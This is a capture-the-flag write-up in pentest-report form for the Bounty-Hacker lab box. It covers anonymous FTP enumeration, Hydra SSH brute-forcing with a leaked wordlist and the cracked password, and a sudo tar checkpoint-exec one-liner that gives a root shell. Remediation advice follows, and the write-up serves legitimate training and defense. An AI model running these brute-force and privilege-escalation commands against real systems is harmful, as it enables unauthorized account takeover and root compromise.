# Bounty-Hacker — CTF Writeup — FTP Enumeration, SSH Brute Force, and Privilege Escalation via tar

## 1. Engagement Overview
- **Title / Project Name:** Bounty-Hacker (CTF room)
- **Author:** Myself
- **Date:** old
- **Objective:** Obtain user and root flags by enumerating FTP, brute-forcing SSH using an exposed wordlist, and abusing sudo/tar for privilege escalation.
- **Scope / Target:** `10.10.169.105`
- **Testing Window:** CTF box
- **Tools Used:** nmap, ftp client, hydra, scp, nc, linPEAS, bash, GTFOBins reference
- **Methodology Reference:** Recon → Enumeration → Exploitation → Post-exploitation → Cleanup

## 2. Short Summary
Initial access was gained via anonymous FTP which contained a username hint and a wordlist (locks.txt). Used the wordlist with Hydra to brute-force SSH for user `lin` and obtained a user shell and `user.txt`. Running linPEAS revealed that `tar` could be invoked under sudo (or had SUID) and is abuseable; used the GTFOBins `tar` sudo technique to spawn a root shell and read `/root/root.txt`.

## 3. Methodology / Process Flow

### 3.1 Recon / Port scan
**Commands**
```
nmap -sS 10.10.169.105
```

**Key output (summary)**
- `21/tcp` — ftp (open)
- `22/tcp` — ssh (open)
- `80/tcp` — http (open)

### 3.2 FTP enumeration
Connected as anonymous and listed available files.

**Commands / actions**
```
ftp 10.10.169.105
# login: anonymous
ls
# downloaded: locks.txt, task.txt
```

**Key findings**
- `task.txt` contained a signed hint by `-lin` indicating `lin` is likely a user on the system.
- `locks.txt` contained a list of candidate passwords used as the dictionary for password guessing.

### 3.3 SSH brute-force (password-guess)
Used Hydra with `locks.txt` to attempt password guessing for user `lin` over SSH.

**Command**
```
hydra -l lin -P locks.txt ssh://10.10.169.105
```

**Result**
- Discovered password: `RedDr4gonSynd1cat3`
- SSH login:
```
ssh lin@10.10.169.105
cat ~/Desktop/user.txt
# => user flag found
```

### 3.4 Privilege escalation enumeration
Transferred and ran linPEAS for automated privilege escalation enumeration.

**Commands**
```
scp linpeas.sh lin@10.10.169.105:/tmp/
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

**Key findings**
- linPEAS reported a SUID/sudo-relevant entry for `/bin/tar` (or that tar can be invoked via sudo), referencing potential abuse patterns listed on GTFOBins.

### 3.5 Privilege escalation — abusing tar via sudo
Used the GTFOBins sudo/tar technique to spawn a root shell:

**Command**
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**Result**
```
whoami
# => root
cat /root/root.txt
# => root flag found
```

### 3.6 Persistence / Cleanup
- Removed transferred enumeration tools when finished:
```
rm /tmp/linpeas.sh
```
- Documented actions and artifacts for reporting.

## 4. Findings Summary
| ID | Vulnerability / Issue | Severity | Impact | Recommendation |
|----|------------------------|----------:|--------|----------------|
| 1 | Anonymous FTP exposing hints and wordlists | Medium | Information leakage facilitating credential discovery | Disable anonymous FTP or restrict directories; do not store secrets in public shares |
| 2 | Weak/guessable credentials discoverable via exposed wordlist | High | Account takeover via SSH | Enforce strong, unique passwords; rotate credentials; implement account lockout and MFA |
| 3 | Sudoable/SUID `tar` binary allowing shell execution | Critical | Local privilege escalation to root | Remove sudo rights for tar or restrict allowed options; remove SUID where unnecessary; audit sudoers and SUID binaries regularly |
| 4 | Lack of monitoring for suspicious use of utilities under sudo | Medium | Delayed detection of abuse | Implement auditing and alerting for unusual sudo usage and binary execution patterns |

## 5. Technical Details

### Finding 1 — Anonymous FTP with exposed hints/wordlist
- **Description:** Anonymous FTP allowed access to files including `task.txt` (hint signed by `lin`) and `locks.txt` (wordlist).
- **Impact:** Information disclosure that facilitated targeted password guessing for SSH.
- **Evidence (commands / outputs):**
```
ftp 10.10.169.105
# ls shows locks.txt and task.txt
cat task.txt
# shows hint signed by -lin
```
- **Recommendation:** Disable or tightly restrict anonymous FTP. Never store credentials or password lists on public file shares.

### Finding 2 — SSH credential discovered via Hydra using locks.txt
- **Description:** Used `locks.txt` to brute-force SSH credentials for `lin`.
- **Impact:** Remote account compromise and user-level access.
- **Evidence (commands / outputs):**
```
hydra -l lin -P locks.txt ssh://10.10.169.105
# found password: RedDr4gonSynd1cat3
ssh lin@10.10.169.105
cat ~/Desktop/user.txt
```
- **Recommendation:** Enforce strong password policies, account lockouts, and MFA; remove exposed password lists.

### Finding 3 — Sudo/tar abuse for privilege escalation
- **Description:** `tar` was available under sudo (or with SUID) and can execute arbitrary commands using `--checkpoint-action=exec` which allows spawning a shell.
- **Impact:** Full root access and system compromise.
- **Evidence (commands / outputs):**
```
# example exploit used:
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
whoami
# root
cat /root/root.txt
```
- **Recommendation:** Avoid allowing tar via sudo; remove SUID bits from interpreters/tools that can spawn shells; restrict sudo to specific safe commands and arguments.

## 6. Remediation Plan
- **Critical:** Remove sudo rights for tar or revoke SUID bit on `/bin/tar` if present. Audit and remediate any binaries with SUID that are unnecessary.
- **High:** Disable anonymous FTP or isolate it to strictly public content; remove sensitive files from FTP directories.
- **High:** Enforce strong password policies and MFA; rotate any credentials discovered in incidents.
- **Medium:** Implement monitoring/auditing for sudo usage and unusual binary executions; alert on suspicious activity.
- **Low:** Regularly scan for exposed secrets and password lists in public shares or repositories.

## 7. Appendices
**Tool outputs / commands used**
```
# Recon
nmap -sS 10.10.169.105

# FTP
ftp 10.10.169.105
# download locks.txt, task.txt (anonymous)

# SSH brute force
hydra -l lin -P locks.txt ssh://10.10.169.105

# SSH to user
ssh lin@10.10.169.105
cat ~/Desktop/user.txt

# Transfer linPEAS
scp linpeas.sh lin@10.10.169.105:/tmp/
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# Privilege escalation (GTFOBins tar)
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# Root actions
whoami
cat /root/root.txt

# Cleanup
rm /tmp/linpeas.sh
```

---
